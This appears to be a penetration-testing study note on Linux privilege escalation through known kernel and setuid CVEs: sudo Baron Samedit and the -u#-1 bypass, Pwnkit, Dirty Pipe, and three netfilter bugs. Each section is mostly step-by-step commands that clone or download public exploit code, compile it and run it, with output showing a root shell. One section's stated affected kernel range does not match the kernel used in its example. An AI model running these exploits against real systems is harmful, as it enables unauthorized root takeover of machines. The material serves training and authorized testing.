## 1-Sudo
`sudo` lets a user run commands as another user (usually root) on UNIX systems.  
It adds security by controlling admin access, and `/etc/sudoers` defines who can run which commands and with what privileges.
```bash
sudo cat /etc/sudoers | grep -v "#" | sed -r '/^\s*$/d'
 # Defaults        env_reset
 # Defaults        mail_badpass
 #  Defaults        secure_path="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin"
 # Defaults        use_pty
 # root            ALL=(ALL:ALL) ALL
 # %admin          ALL=(ALL) ALL
 # %sudo           ALL=(ALL:ALL) ALL
 # cry0l1t3        ALL=(ALL) /usr/bin/id
 #  @includedir     /etc/sudoers.d
```
One of the latest vulnerabilities for `sudo` carries the CVE-2021-3156 and is based on a heap-based buffer overflow vulnerability. This affected the sudo versions:
- **1.8.31 - Ubuntu 20.04**
- **1.8.27 - Debian 10**
- **1.9.2 - Fedora 33**
- **and others**
to find the sudo  version:
```bash
sudo -V | head -n1 #  sudo version 1.8.31
```

This vulnerability existed for over ten years before discovery, and a public [Proof-Of-Concept](https://github.com/blasty/CVE-2021-3156) is available that can be downloaded to a local copy or directly to the target if internet access exists.
```bash
git clone https://github.com/blasty/CVE-2021-3156.git
cd CVE-2021-3156
make
```
When running the exploit, we can be shown a list that will list all available versions of the operating systems that may be affected by this vulnerability.
```bash
./sudo-hax-me-a-sandwich
  # usage: ./sudo-hax-me-a-sandwich <target>

  # available targets:
  ------------------------------------------------------------
  #  0) Ubuntu 18.04.5 (Bionic Beaver) - sudo 1.8.21, libc-2.27
  #  1) Ubuntu 20.04.1 (Focal Fossa) - sudo 1.8.31, libc-2.31
  #  2) Debian 10.0 (Buster) - sudo 1.8.27, libc-2.28
  ------------------------------------------------------------
```
We can find out which version of the operating system we are dealing with using the following command:
```bash
cat /etc/lsb-release # DISTRIB_DESCRIPTION="Ubuntu 20.04.1 LTS"
```
Next, we specify the respective ID for the version operating system and run the exploit with our payload.
```bash
./sudo-hax-me-a-sandwich 1
# id : uid=0(root) gid=0(root) groups=0(root)
```
#### Sudo Policy Bypass (sudo version < 1.8.28)
Another vulnerability was found in 2019 that affected all versions below `1.8.28`, which allowed privileges to escalate even with a simple command. This vulnerability has the [CVE-2019-14287](https://www.sudo.ws/security/advisories/minus_1_uid/) and requires only a single prerequisite. It had to allow a user in the `/etc/sudoers` file to execute a specific command.
```bash
sudo -l
  # User cry0l1t3 may run the following commands on Penny:
     #  ALL=(ALL) /usr/bin/id
```
In fact, `Sudo` also allows commands with specific user IDs to be executed, which executes the command with the user's privileges carrying the specified ID. The ID of the specific user can be read from the `/etc/passwd` file.
```bash
cat /etc/passwd | grep cry0l1t3
  # cry0l1t3:x:1005:1005:cry0l1t3,,,:/home/cry0l1t3:/bin/bash
```
Thus the ID for the user `cry0l1t3` would be `1005`. If a negative ID (`-1`) is entered at `sudo`, this results in processing the ID `0`, which only the `root` has. This, therefore, led to the immediate root shell.
```bash
sudo -u#-1 id
root@~ # id : uid=0(root) gid=1005(cry0l1t3) groups=1005(cry0l1t3)
```


---

## 2- Polkit
PolicyKit (polkit) is a Linux authorization service that controls whether users or applications can perform system actions.  
It allows fine-grained permission rules per user, group, or application, including temporary or admin approval.
Polkit works with two groups of files.

1. actions/policies (`/usr/share/polkit-1/actions`)
2. rules (`/usr/share/polkit-1/rules.d`)

Polkit also has `local authority` rules which can be used to set or remove additional permissions for users and groups. Custom rules can be placed in the directory `/etc/polkit-1/localauthority/50-local.d` with the file extension `.pkla`.

PolKit also comes with three additional programs:

- `pkexec` - runs a program with the rights of another user or with root rights
- `pkaction` - can be used to display actions
- `pkcheck` - this can be used to check if a process is authorized for a specific action

The most interesting tool for us, in this case, is `pkexec` because it performs the same task as `sudo` and can run a program with the rights of another user or root.
```bash
# pkexec -u <user> <command>
pkexec -u root id # uid=0(root) gid=0(root) groups=0(root)
```
In the `pkexec` tool, the memory corruption vulnerability with the identifier [CVE-2021-4034](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-4034) was found, also known as [Pwnkit](https://blog.qualys.com/vulnerabilities-threat-research/2022/01/25/pwnkit-local-privilege-escalation-vulnerability-discovered-in-polkits-pkexec-cve-2021-4034) and also leads to privilege escalation. This vulnerability was also hidden for more than ten years, and no one can precisely say when it was discovered and exploited. Finally, in November 2021, this vulnerability was published and fixed two months later.

To exploit this vulnerability, we need to download a [PoC](https://github.com/arthepsy/CVE-2021-4034) and compile it on the target system itself or a copy we have made.
```bash
# alternative poc https://codeload.github.com/berdav/CVE-2021-4034/zip/main 

git clone https://github.com/arthepsy/CVE-2021-4034.git
cd CVE-2021-4034
gcc cve-2021-4034-poc.c -o poc
```
Once we have compiled the code, we can execute it without further ado. After the execution, we change from the standard shell (`sh`) to Bash (`bash`) and check the user's IDs.
```bash
./poc
# id uid=0(root) gid=0(root) groups=0(root)
```


---
## 3- Dirty Pipe
A vulnerability in the Linux kernel, named [Dirty Pipe](https://dirtypipe.cm4all.com/) ([CVE-2022-0847](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-0847)), allows unauthorized writing to root user files on Linux. Technically, the vulnerability is similar to the [Dirty Cow](https://dirtycow.ninja/) vulnerability discovered in 2016. All kernels from version `5.8` to `5.17` are affected and vulnerable to this vulnerability
This vulnerability is based on pipes. Pipes are a mechanism of unidirectional communication between processes that are particularly popular on Unix systems. For example, we could edit the `/etc/passwd` file and remove the password prompt for the root. This would allow us to log in with the `su` command without the password prompt.

To exploit this vulnerability, we need to download a [PoC](https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits) and compile it on the target system itself or a copy we have made.
```bash
git clone https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits.git
cd CVE-2022-0847-DirtyPipe-Exploits
bash compile.sh
```
After compiling the code, we have two different exploits available. The first exploit version (`exploit-1`) modifies the `/etc/passwd` and gives us a prompt with root privileges. For this, we need to verify the kernel version and then execute the exploit.
**Verify Kernel Version**
```bash
uname -r # 5.13.0-46-generic
```
**Exploitation**
```bash
./exploit-1
#~  id  uid=0(root) gid=0(root) groups=0(root)
```

With the help of the 2nd exploit version (`exploit-2`), we can execute SUID binaries with root privileges. However, before we can do that, we first need to find these SUID binaries. For this, we can use the following command:
**Find SUID Binaries**
```bash
find / -perm -4000 2>/dev/null
 # /usr/bin/sudo
```
Then we can choose a binary and specify the full path of the binary as an argument for the exploit and execute it.
```bash
./exploit-2 /usr/bin/sudo
# id : uid=0(root) gid=0(root) groups=0(root)
```


---

## 4- Netfilter
Netfilter is a Linux kernel layer that controls network traffic through packet filtering, NAT, and connection tracking, used by tools like iptables.  
When the module is activated, all IP packets are checked by the `Netfilter` before they are forwarded to the target application of the own or remote system. In 2021 ([CVE-2021-22555](https://github.com/google/security-research/tree/master/pocs/linux/cve-2021-22555)), 2022 ([CVE-2022-1015](https://github.com/pqlx/CVE-2022-1015)), and also in 2023 ([CVE-2023-32233](https://github.com/Liuk3r/CVE-2023-32233)), several vulnerabilities were found that could lead to privilege escalation.
Many systems run old kernels for compatibility, and even VMs or containers rely on the host kernel, making breakouts possible.
#### CVE-2021-22555
**Vulnerable kernel versions: 2.6 - 5.11**
```bash
uname -r # 5.10.5-051005-generic
```
```bash
wget https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c
gcc -m32 -static exploit.c -o exploit
./exploit
# id : uid=0(root) gid=0(root) groups=0(root)
```
#### CVE-2022-25636
A recent vulnerability is [CVE-2022-25636](https://www.cvedetails.com/cve/CVE-2022-25636/) and **affects Linux kernel 5.4 through 5.6.10**. This is `net/netfilter/nf_dup_netdev.c`, which can grant root privileges to local users due to heap out-of-bounds write. `Nick Gregory` wrote a very detailed [article](https://nickgregory.me/post/2022/03/12/cve-2022-25636/) about how he discovered this vulnerability.
```bash
uname -r # 5.13.0-051300-generic
```
```bash
git clone https://github.com/Bonfee/CVE-2022-25636.git
cd CVE-2022-25636
make
./exploit
# id : root
```
#### CVE-2023-32233
This vulnerability exploits the so called `anonymous sets` in `nf_tables` by using the `Use-After-Free` vulnerability in the Linux Kernel up to version `6.3.1`. These `nf_tables` are temporary workspaces for processing batch requests and once the processing is done, these anonymous sets are supposed to be cleared out (`Use-After-Free`) so they cannot be used anymore. Due to a mistake in the code, these anonymous sets are not being handled properly and can still be accessed and modified by the program.

The exploitation is done by manipulating the system to use the `cleared out` anonymous sets to interact with the kernel's memory. By doing so, we can potentially gain `root` privileges.
**Proof-Of-Concept**
```shell-session
git clone https://github.com/Liuk3r/CVE-2023-32233
cd CVE-2023-32233
gcc -Wall -o exploit exploit.c -lmnl -lnftnl
```
 **Exploitation**
 ```bash
./exploit
# id : root
```
